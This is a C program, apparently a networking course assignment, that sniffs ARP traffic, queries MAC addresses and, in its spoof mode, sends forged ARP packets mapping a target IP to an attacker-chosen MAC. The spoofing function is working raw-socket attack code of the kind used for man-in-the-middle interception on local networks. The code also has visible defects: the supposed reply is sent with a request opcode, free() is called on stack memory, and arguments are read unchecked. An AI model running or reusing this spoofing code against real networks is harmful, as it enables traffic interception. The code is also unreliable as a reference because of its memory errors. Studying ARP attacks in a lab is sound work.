#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h> // inet_ntop
#include "arp.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <stdbool.h>

/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
// My device: ens33
#define DEVICE_NAME "enp2s0f5"

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

void packet_receiver(char* specified_IP, bool control, bool spoof_mode, char* fake_MAC);
unsigned char* send_arp_request(const char *target_ip);
void fake_reply(char* sender_ip, char* target_ip, char* sender_addr, char* fake_MAC);
void print_explanation();

int main(int argc, char *argv[])
{
	printf("[ ARP sniffer and spoof program ]\n");
    if (getenv("SUDO_UID")==NULL){  // Test sudo
        printf("ERROR: You must be root to use this tool.\n");
    }
	else if (strcmp(argv[1], "-l") == 0){
		if (strcmp(argv[2], "-a") == 0){	// list all packet
			printf("### ARP sniffer mode. ###\n");
			packet_receiver(NULL, false, false, NULL);
		} 
        else {  // specified the ip address
        printf("### ARP sniffer mode.(Filtered specified IP address) ###\n");
            packet_receiver(argv[2], true, false, NULL);
        }
	}
	else if (strcmp(argv[1], "-q") == 0){
		printf("### ARP query mode. ###\n");
		unsigned char* req = send_arp_request(argv[2]);
        free(req);
	}
    else if (strcmp(argv[1], "-help")==0){
        print_explanation();
    }
    else {
        printf("### ARP spoof mode. ###\n");
        packet_receiver(argv[2], true, true, argv[1]);
        printf("Send Successfully.\n");
    }
	
// 	int sockfd_recv = 0, sockfd_send = 0;
// 	struct sockaddr_ll sa;
// 	struct ifreq req;
// 	struct in_addr myip;
	
// 	// Open a recv socket in data-link layer.
// 	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
// 	{
// 		perror("open recv socket error");
// 		exit(1);
// 	}

// 	/*
// 	 * Use recvfrom function to get packet.
// 	 * recvfrom( ... )
// 	 */
// 	char recv_buf[1500];
// 	socklen_t* sa_len;
// 	int recv_size;
// 	recv_size = recvfrom(sockfd_recv, recv_buf, strlen(recv_buf), 0, (struct sockaddr*)&sa, sa_len);


	
// 	// Open a send socket in data-link layer.
// 	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
// 	{
// 		perror("open send socket error");
// 		exit(sockfd_send);
// 	}
	
// 	/*
// 	 * Use ioctl function binds the send socket and the Network Interface Card.
// `	 * ioctl( ... )
// 	 */
// 	ioctl(sockfd_send, SIOCGIFADDR, &req);
// 	memcpy(&myip, &req.ifr_addr, sizeof(struct in_addr)); // 將 IP 位址複製到 myip 變數

	
// 	// Fill the parameters of the sa.
// 	memset(&sa, 0, sizeof(sa)); // 清空 sa 結構
// 	sa.sll_protocol = htons(ETH_P_ALL); // 設定協定
// 	sa.sll_ifindex = req.ifr_ifindex; // 設定介面的索引


	
// 	/*
// 	 * use sendto function with sa variable to send your packet out
// 	 * sendto( ... )
// 	 */
// 	char send_buf[1500];
// 	int send_size;
// 	send_size = (sockfd_send, send_buf, strlen(send_buf), 0, (struct sockaddr*)&sa, sizeof(sa));

	return 0;
}

void packet_receiver(char* specified_IP, bool control, bool spoof_mode, char* fake_MAC){
	
	int sockfd_recv = 0;
	char recv_buf[1500];
	struct sockaddr_ll sa;
	struct ifreq req;
	struct in_addr myip;
	
	// Open a recv socket in data-link layer.
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open recv socket error");
		exit(1);
	}

	while (1) {
        // 接收 ARP 封包
        int recv_size = recvfrom(sockfd_recv, recv_buf, sizeof(recv_buf), 0, NULL, NULL);
        if (recv_size < 0) {
            perror("recvfrom error");
            continue;
        }

        struct ether_header *eth_hdr = (struct ether_header *)recv_buf;
        struct ether_arp *arp_hdr = (struct ether_arp *)(recv_buf + sizeof(struct ether_header));

        // 檢查是否為 ARP 封包
        if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP) {
            
            char sender_ip[INET_ADDRSTRLEN];
            char target_ip[INET_ADDRSTRLEN];

            // 提取發送者和目標 IP 地址
            inet_ntop(AF_INET, arp_hdr->arp_spa, sender_ip, sizeof(sender_ip));
            inet_ntop(AF_INET, arp_hdr->arp_tpa, target_ip, sizeof(target_ip));

            if (control){   // filtered
                // 印出訊息
                if (strcmp(target_ip, specified_IP) == 0)
                    printf("Get ARP packet - Who has %s? \t Tell %s\n", target_ip, sender_ip);
                if (spoof_mode) {    
                    char *sender_addr = get_sender_hardware_addr(arp_hdr);
                    char target_addr[20];
                    memcpy(target_addr, fake_MAC, 20-1);
                    fake_reply((char*)&sender_ip, (char*)&target_ip, sender_addr, fake_MAC);  
                    return;
                    }
            }
            else {
                // 印出訊息
                printf("Get ARP packet - Who has %s? \t Tell %s\n", target_ip, sender_ip);
            }
        }
    }

}

unsigned char* send_arp_request(const char *target_ip) {
    int sockfd;
    struct sockaddr_ll sa;
    struct ifreq req;
    struct arp_packet packet;

    // 開啟原始 socket
    if ((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("socket error");
        exit(1);
    }

    // 獲取網卡的索引
    memset(&req, 0, sizeof(req));
    strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ);

    // 獲取本地網卡的 MAC 地址
    if (ioctl(sockfd, SIOCGIFHWADDR, &req) < 0) {
        perror("ioctl MAC error");
        exit(1);
    }
    unsigned char *local_mac = (unsigned char *) req.ifr_hwaddr.sa_data;

    // 填寫以太網標頭
    memset(&packet, 0, sizeof(packet));
    struct ether_header *eth_hdr = (struct ether_header *) &packet;
    memcpy(eth_hdr->ether_shost, local_mac, ETH_ALEN);  // 本機 MAC 地址
    memset(eth_hdr->ether_dhost, 0xff, ETH_ALEN);  // 廣播地址
    eth_hdr->ether_type = htons(ETHERTYPE_ARP);

    // 填寫 ARP 頭部
    set_hard_type(&packet.arp, htons(ARPHRD_ETHER));
    set_prot_type(&packet.arp, htons(ETHERTYPE_IP));
    set_hard_size(&packet.arp, ETH_ALEN);
    set_prot_size(&packet.arp, 4);  // IPv4 地址長度
    set_op_code(&packet.arp, htons(ARPOP_REQUEST));

    int res = ioctl(sockfd, SIOCGIFADDR, &req) < 0;
    char *local_ip = inet_ntoa(((struct sockaddr_in*)&req.ifr_addr)->sin_addr);
  
    // 設置發送者的 MAC 和 IP 地址
    set_sender_hardware_addr(&packet.arp, local_mac);
    inet_pton(AF_INET, local_ip, packet.arp.arp_spa);  // 本機 IP 地址

    // 設置目標的 MAC 和 IP 地址
    set_target_hardware_addr(&packet.arp, "\x00\x00\x00\x00\x00\x00");  // 目標 MAC 地址 (未知)
    inet_pton(AF_INET, target_ip, packet.arp.arp_tpa);  // 目標 IP 地址

    // 填充 sa 結構
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = req.ifr_ifindex;

    // 發送 ARP 封包
    if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("sendto error");
        exit(1);
    }

    struct arp_packet recv_packet;
    while (1) {
        if (recv(sockfd, &recv_packet, sizeof(recv_packet), 0) < 0) {
            perror("recv error");
            exit(1);
        }

        // 檢查是否是 ARP 回應，並且是否來自我們查詢的目標 IP
        if (ntohs(recv_packet.arp.ea_hdr.ar_op) == ARPOP_REPLY) {
            char sender_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, recv_packet.arp.arp_spa, sender_ip, sizeof(sender_ip));

            if (strcmp(sender_ip, target_ip) == 0) {
                // 打印目標的 MAC 地址
                unsigned char *mac = get_sender_hardware_addr(&recv_packet.arp);
                printf("MAC address of %s is %02x:%02x:%02x:%02x:%02x:%02x\n", 
                       sender_ip, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
                return mac;
            }
        }
    }
}

void fake_reply(char* sender_ip, char* target_ip, char* sender_addr, char* fake_MAC){
    int sockfd;
    struct sockaddr_ll sa;
    struct ifreq req;
    struct arp_packet packet;
    // 開啟原始 socket
    if ((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("socket error");
        exit(1);
    }

    // 獲取網卡索引
    memset(&req, 0, sizeof(struct ifreq));
    strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ - 1);  // 替換成你自己的網卡名稱
    if (ioctl(sockfd, SIOCGIFINDEX, &req) < 0) {
        perror("ioctl error");
        exit(1);
    }

    // convert string to byte array
    unsigned char fake_mac_array[6];
    // 使用 sscanf 逐個提取 MAC 地址的字節
    if (sscanf(fake_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &fake_mac_array[0], &fake_mac_array[1], &fake_mac_array[2],
               &fake_mac_array[3], &fake_mac_array[4], &fake_mac_array[5]) != 6) {
        fprintf(stderr, "Invalid MAC address format\n");
        exit(1);
    }

    // 填寫以太網標頭
    memset(&packet, 0, sizeof(packet));
    struct ether_header *eth_hdr = (struct ether_header *) &packet;
    memcpy(eth_hdr->ether_shost, fake_mac_array, ETH_ALEN);  // Sender MAC 地址
    memcpy(eth_hdr->ether_dhost, sender_addr, ETH_ALEN);  // Fake 地址
    eth_hdr->ether_type = htons(ETHERTYPE_ARP);

    // 填寫 ARP 頭部
    set_hard_type(&packet.arp, htons(ARPHRD_ETHER));
    set_prot_type(&packet.arp, htons(ETHERTYPE_IP));
    set_hard_size(&packet.arp, ETH_ALEN);
    set_prot_size(&packet.arp, 4);  // IPv4 地址長度
    set_op_code(&packet.arp, htons(ARPOP_REQUEST));
  
    // 設置發送者的 MAC 和 IP 地址
    set_sender_hardware_addr(&packet.arp, fake_mac_array);
    inet_pton(AF_INET, target_ip, packet.arp.arp_spa);  // 目標 IP 地址

    // 設置目標的 MAC 和 IP 地址
    set_target_hardware_addr(&packet.arp, sender_addr);  // FAKE MAC 地址 
    inet_pton(AF_INET, sender_ip, packet.arp.arp_tpa);  // request ARP sender IP 地址

    // 填充 sa 結構
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = req.ifr_ifindex;

    // 發送 ARP 封包
    if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("sendto error");
        exit(1);
    }
    else{
        unsigned char *mac = get_sender_hardware_addr(&packet.arp);
        printf("Sent ARP Reply : %s is %02x:%02x:%02x:%02x:%02x:%02x\n",
        target_ip, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        free(mac);
    }

}

void print_explanation(){
    printf("Hello! Welcome to ARP Simulation program.\n");
    printf("***   Run in Ubuntu 24.04.   ***\n");
    printf("***   EveryTime You run this program should add sudo before the command.   ***\n");
    printf("This program supported the following commands.\n");
    printf("1) ./main -l -a\n");
    printf("Note: List all ARP packet.\n");
    printf("2) ./main -l <ip_address>\n");
    printf("Note: This will filter <ip_address>, the same functionality like 1).\n");
    printf("3) ./main -q <ip_address>\n");
    printf("Note: This will query specific <ip_address>'s MAC address.\n");
    printf("4) ./main <fake_mac_address> <target_ip_address>\n");
    printf("Note: This will send <fake_mac_address> to specfic <target_ip_address>.\n");
}